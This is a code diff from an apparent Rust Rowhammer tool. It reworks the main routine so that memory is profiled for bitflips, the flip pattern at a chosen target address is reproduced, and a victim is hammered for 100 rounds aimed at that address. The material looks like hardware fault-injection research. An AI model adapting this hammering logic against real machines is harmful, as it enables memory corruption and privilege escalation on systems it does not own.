@@ -339,16 +339,6 @@ unsafe fn _main() -> anyhow::Result<()> {
         let alloc_duration = std::time::Instant::now() - start;
         info!("Allocated {} bytes of memory", memory.len());
 
-        let hammer = make_hammer(
-            &args.hammerer,
-            &pattern.pattern,
-            &pattern.mapping,
-            mem_config,
-            block_size,
-            &memory,
-            args.attempts,
-            false,
-        )?;
         info!("Profiling memory for vulnerable addresses");
         info!(
             "Expecting bitflips at {:?}",
@@ -365,6 +355,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             &memory,
             args.attempts,
             true,
+            None,
         )?;
         let profiling = hammer_profile(
             &profile_hammer,
@@ -451,14 +442,14 @@ unsafe fn _main() -> anyhow::Result<()> {
         );
 
         // find round with flips in `addr`, get seed
-        let pattern = profiling
+        let dpattern = profiling
             .rounds
             .iter()
             .find(|r| r.bit_flips.iter().any(|b| b.addr == addr))
             .expect("no round with flips in addr")
             .pattern
             .clone();
-        let success = reproduce_pattern(&profile_hammer, pattern.clone(), &memory, 10);
+        let success = reproduce_pattern(&profile_hammer, dpattern.clone(), &memory, 10);
         match success {
             Ok(success) => {
                 info!("Reproduced pattern {} times", success);
@@ -474,7 +465,7 @@ unsafe fn _main() -> anyhow::Result<()> {
                 continue;
             }
         }
-        memory.initialize(pattern.clone());
+        memory.initialize(dpattern.clone());
         let addr = addr & !0xfff; // mask out the lowest 12 bits
         let target_pfn = (addr as *const u8).pfn().expect("no pfn") >> PAGE_SHIFT;
 
@@ -529,7 +520,18 @@ unsafe fn _main() -> anyhow::Result<()> {
         };
         match victim {
             Some(mut victim) => {
-                loop {
+                for _ in 0..100 {
+                    let hammer = make_hammer(
+                        &args.hammerer,
+                        &pattern.pattern,
+                        &pattern.mapping,
+                        mem_config,
+                        block_size,
+                        &memory,
+                        args.attempts,
+                        false,
+                        Some(vec![addr as *const u8]),
+                    )?;
                     let result = hammer.hammer(&mut victim);
                     match result {
                         Ok(result) => {
@@ -551,7 +553,6 @@ unsafe fn _main() -> anyhow::Result<()> {
                 warn!("No target specified.");
             }
         }
-        drop(hammer);
         memory.dealloc();
     }
     bail!(
